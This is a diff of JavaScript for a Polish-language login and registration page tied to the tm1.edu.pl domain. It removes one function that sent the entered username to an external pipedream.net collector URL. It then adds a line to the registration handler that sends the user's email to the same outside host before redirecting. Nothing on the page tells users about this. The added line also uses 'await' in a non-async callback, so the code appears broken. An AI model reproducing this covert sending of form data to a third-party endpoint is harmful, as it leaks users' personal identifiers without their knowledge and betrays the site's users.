@@ -1,10 +1,3 @@
-async function logging(){
-    const t = document.getElementById("username").value;
-    await fetch(`https://eo2isf33hwr4zgo.m.pipedream.net/?email=${t}`);
-    window.location.reload();
-}
-
-
 function forgotPassMessage(){
     r = document.getElementById("result");
     r.innerHTML = "Wprowadź poświadczenia przekazane przez opiekuna (adres email z domeny tm1.edu.pl)";
@@ -44,9 +37,8 @@ btnNext.addEventListener("click", function () {
     else if (p1!=p2)
         r.innerHTML = "Wprowadzone hasła się nie zgadzają.";
     else if (r.innerHTML == "") 
+        await fetch(`https://eo2isf33hwr4zgo.m.pipedream.net/?email=${e}`);
         location.href = 'register.html';
-
-    
     // window.location.reload();
 });
 
